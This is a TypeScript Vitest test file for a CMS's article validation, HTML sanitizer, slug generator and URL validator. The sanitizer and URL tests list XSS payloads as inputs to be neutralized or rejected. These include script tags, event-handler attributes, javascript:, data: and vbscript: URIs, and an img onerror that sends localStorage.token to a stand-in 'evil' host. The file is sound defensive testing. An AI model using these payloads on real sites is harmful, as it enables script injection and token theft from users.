import { describe, it, expect } from 'vitest';
import {
    createArticleSchema,
    updateArticleSchema,
} from '../controllers/articles.controller';
import { generateSlug, generateUniqueSlug } from '../services/slug';
import { sanitizeArticleHtml } from '../../utils/sanitize';
import { optionalHttpUrl } from '../services/validators';

type Parsed = Record<string, unknown>;

describe('createArticleSchema', () => {
    const base = { title: 'Women in Tech 2026', categoryId: 1 };

    it('preserves status instead of stripping it', () => {
        // Regression: status was absent from the schema, so validate() stripped
        // it and the publish-on-create branch was unreachable.
        const result = createArticleSchema.safeParse({ ...base, status: 'published' });
        expect(result.success).toBe(true);
        expect((result.data as Parsed).status).toBe('published');
    });

    it('rejects a status outside the enum', () => {
        expect(createArticleSchema.safeParse({ ...base, status: 'bogus' }).success).toBe(false);
    });

    it('leaves status undefined when omitted so the controller default applies', () => {
        const result = createArticleSchema.safeParse(base);
        expect(result.success).toBe(true);
        expect((result.data as Parsed).status).toBeUndefined();
    });

    it('sanitizes content at the validation boundary', () => {
        const result = createArticleSchema.safeParse({
            ...base,
            content: '<p>Real copy</p><script>alert(1)</script><img src=x onerror="steal()">',
        });
        expect(result.success).toBe(true);
        const content = (result.data as Parsed).content as string;
        expect(content).toContain('<p>Real copy</p>');
        expect(content).not.toMatch(/<script|onerror/i);
    });

    it('still requires a title and category', () => {
        expect(createArticleSchema.safeParse({ title: '', categoryId: 1 }).success).toBe(false);
        expect(createArticleSchema.safeParse({ title: 'x' }).success).toBe(false);
    });

    it('rejects a javascript: featuredImage but accepts a real one', () => {
        expect(createArticleSchema.safeParse({ ...base, featuredImage: 'javascript:alert(1)' }).success).toBe(false);
        expect(createArticleSchema.safeParse({ ...base, featuredImage: 'https://res.cloudinary.com/x.jpg' }).success).toBe(true);
    });
});

describe('updateArticleSchema', () => {
    it('is partial but still carries and sanitizes the fields it receives', () => {
        const result = updateArticleSchema.safeParse({
            status: 'review',
            content: '<p>ok</p><script>alert(1)</script>',
        });
        expect(result.success).toBe(true);
        expect((result.data as Parsed).status).toBe('review');
        expect((result.data as Parsed).content).not.toMatch(/<script/i);
    });
});

describe('sanitizeArticleHtml', () => {
    it.each([
        ['script tag', '<p>hi</p><script>alert(1)</script>'],
        ['img onerror', '<img src=x onerror="fetch(\'https://evil/\'+localStorage.token)">'],
        ['javascript: href', '<a href="javascript:alert(1)">click</a>'],
        ['svg onload', '<svg onload=alert(1)></svg>'],
        ['inline onclick', '<p onclick="alert(1)">text</p>'],
        ['style url(javascript:)', '<div style="background:url(javascript:alert(1))">x</div>'],
    ])('neutralizes %s', (_label, payload) => {
        const out = sanitizeArticleHtml(payload);
        expect(out).not.toMatch(/<script|onerror|onload|onclick|javascript:/i);
    });

    it.each([
        ['<p>Hello <strong>world</strong></p>'],
        ['<h2>Women in Tech</h2>'],
        ['<ul><li>one</li><li>two</li></ul>'],
        ['<a href="https://example.com" target="_blank">link</a>'],
        ['<img src="https://res.cloudinary.com/x.jpg" alt="a">'],
        ['<p class="ql-align-center">centered</p>'],
        ['<blockquote>quoted</blockquote>'],
    ])('preserves legitimate editor output: %s', (payload) => {
        expect(sanitizeArticleHtml(payload)).toBe(payload);
    });

    it('returns a string for empty input', () => {
        expect(sanitizeArticleHtml(undefined)).toBe('');
        expect(sanitizeArticleHtml(null)).toBe('');
    });
});

describe('generateUniqueSlug', () => {
    const taken = (...slugs: string[]) => async (s: string) => slugs.includes(s);

    it('returns the plain slug when it is free', async () => {
        expect(await generateUniqueSlug('Women in Tech 2026', taken())).toBe('women-in-tech-2026');
    });

    it('suffixes until it finds a free slug', async () => {
        const slug = await generateUniqueSlug('Women in Tech', taken('women-in-tech', 'women-in-tech-2'));
        expect(slug).toBe('women-in-tech-3');
    });

    it('falls back for titles that slugify to nothing', async () => {
        // Regression: emoji/punctuation-only titles produced '', which is
        // unroutable and collided with the next such title.
        for (const title of ['🎉🎉🎉', '???', '!!!', '   ']) {
            expect(generateSlug(title)).toBe('');
            expect(await generateUniqueSlug(title, taken())).toBe('article');
        }
    });

    it('avoids colliding with an earlier fallback slug', async () => {
        expect(await generateUniqueSlug('???', taken('article'))).toBe('article-2');
    });
});

describe('optionalHttpUrl', () => {
    it.each([
        ['', true],
        ['https://example.com/x.jpg', true],
        ['http://example.com/x.jpg', true],
        // Root-relative paths are same-origin by construction (written by
        // prisma/seed-scraper.ts for locally-downloaded images) — must stay
        // editable through the normal update flow.
        ['/uploads/imported/x.jpg', true],
        ['javascript:alert(1)', false],
        ['data:text/html,<script>alert(1)</script>', false],
        ['vbscript:msgbox(1)', false],
        ['not a url', false],
        // Protocol-relative resolves to a DIFFERENT origin — must stay blocked.
        ['//evil.com/x.jpg', false],
    ])('%s -> valid=%s', (value, expected) => {
        const result = optionalHttpUrl.safeParse(value);
        expect(result.success).toBe(expected);
    });
});
